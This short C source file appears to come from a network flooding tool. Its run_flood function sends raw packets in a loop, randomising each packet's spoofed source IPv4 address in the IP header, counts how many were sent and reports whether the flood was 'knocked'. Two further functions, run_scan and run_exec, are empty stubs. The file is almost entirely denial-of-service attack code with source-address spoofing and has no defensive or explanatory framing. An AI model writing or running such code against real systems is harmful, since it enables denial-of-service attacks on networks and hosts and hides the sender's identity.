#include "applications.h"

void run_flood(int socket,int num_packets,IP_HEADER* ip_hdr,struct sockaddr_in* myaddr,char* buffer){
	int i,sent=0;
	char knocked = 0;
	char* source_port = "1337";
	char* source_address = 0x00;
	fprintf(stdout,"Sending packets, it could be slow according to size of MAX_PACKETS...\n");
	for(i=0;i<num_packets;i++){
		source_address = generate_random_ip_v4();
		//source_port    = generate_random_valid_port();
		set_sockaddr_in(myaddr,source_address,source_port);
		mod_ip_header_source_ip(ip_hdr,source_address);
		if(sendto(socket, buffer, ip_hdr->total_length, 0, (struct sockaddr *)myaddr, sizeof(*myaddr))>=0) sent++;
		else{ knocked=1; break; }
	}
	fprintf(stdout,"Send process finished, %d packets sent, ",sent);
	if(knocked>0) fprintf(stdout," process knocked\n");
	else fprintf(stdout," process not knocked\n");
}

void run_scan(){}
void run_exec(){}
